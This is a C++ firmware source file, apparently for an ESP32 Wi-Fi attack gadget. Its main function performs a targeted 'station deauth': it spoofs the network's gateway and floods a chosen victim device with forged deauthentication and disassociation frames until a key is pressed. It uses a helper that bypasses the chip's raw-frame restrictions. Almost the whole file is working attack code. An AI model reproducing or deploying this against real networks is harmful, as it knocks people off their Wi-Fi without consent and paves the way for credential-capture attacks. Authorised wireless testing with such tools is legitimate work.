#include "clients.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/net_utils.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "scan_hosts.h"
#include "wifi_atks.h" // to use Station Deauth
#include <esp_wifi.h>
#include <globals.h>
#include <iomanip>
#include <iostream>
#include <lwip/dns.h>
#include <lwip/err.h>
#include <lwip/etharp.h>
#include <lwip/igmp.h>
#include <lwip/inet.h>
#include <lwip/init.h>
#include <lwip/ip_addr.h>
#include <lwip/mem.h>
#include <lwip/memp.h>
#include <lwip/netif.h>
#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <lwip/timeouts.h>
#include <modules/wifi/sniffer.h> //use PCAP file saving functions
#include <sstream>

// Função para obter o MAC do gateway
void getGatewayMAC(uint8_t gatewayMAC[6]) {
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
        memcpy(gatewayMAC, ap_info.bssid, 6);
        Serial.print("Gateway MAC: ");
        Serial.println(macToString(gatewayMAC));
    } else {
        Serial.println("Erro ao obter informações do AP.");
    }
}

// Station deauther for targetted attack.
void stationDeauth(Host host) {
    uint8_t MAC[6];
    uint8_t gatewayMAC[6];
    uint8_t victimIP[4];
    wifi_ap_record_t sta_record;
    for (int i = 0; i < 4; i++) victimIP[i] = host.ip[i];
    String tssid = WiFi.SSID();
    int channel;
    getGatewayMAC(gatewayMAC);
    esp_wifi_get_channel(&ap_record.primary, &ap_record.second);
    channel = ap_record.primary;
    wifiDisconnect();
    delay(10);
    WiFi.mode(WIFI_AP);
    if (!WiFi.softAP(tssid, emptyString, channel, 1, 4, false)) {
        Serial.println("Fail Starting AP Mode");
        displayError("Fail starting Deauth", true);
        return;
    }

    memcpy(ap_record.bssid, gatewayMAC, 6);
    stringToMAC(host.mac.c_str(), MAC);
    memcpy(sta_record.bssid, MAC, 6);

    // Prepare deauth frame for each AP record
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    drawMainBorderWithTitle("Station Deauth");
    tft.setTextSize(FP);
    padprintln("Trying to deauth one target.");
    padprintln("Tgt:" + host.mac);
    padprintln("Tgt: " + ipToString(victimIP));
    padprintln("GTW:" + macToString(gatewayMAC));
    padprintln("");
    padprintln("Press Any key to STOP.");

    long tmp = millis();
    int cont = 0;
    while (!check(AnyKeyPress)) {
        // Send packets from AP to STA
        wsl_bypasser_send_raw_frame(&ap_record, ap_record.primary, MAC);
        deauth_frame[0] = 0xc0; // Deauth Frame
        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
        deauth_frame[0] = 0xa0; // Disassociate Frame
        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));

        // Send packets from STA to AP
        wsl_bypasser_send_raw_frame(&sta_record, ap_record.primary, gatewayMAC);
        deauth_frame[0] = 0xc0; // Deauth Frame
        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
        deauth_frame[0] = 0xa0; // Disassociate Frame
        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));

        cont += 3 * 4;
        delay(50);
        if (millis() - tmp > 1000) {
            tft.drawRightString(String(cont) + " fps", tftWidth - 12, tftHeight - 16, 1);
            cont = 0;
            tmp = millis();
        }
    }

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    wifiDisconnect();
}
